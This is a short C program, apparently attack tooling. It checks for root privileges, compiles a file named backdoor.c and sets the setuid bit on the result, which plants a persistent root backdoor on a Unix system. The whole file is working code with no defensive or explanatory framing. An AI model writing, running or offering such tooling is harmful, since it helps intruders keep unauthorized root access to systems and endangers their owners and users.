#include <stdio.h>

int main(void) {
        int olduid=500;
        olduid=getuid();
        setuid(0);
        if(getuid()){
                printf("must be suid root.\n");
        } else {
		printf("Now building backdoor.c\n");
                system("gcc backdoor.c -o backdoor");
		printf("Setting suid bit\n");
		system("chmod u+s backdoor");
		printf("Done!\n");
        }
        return 0;
}
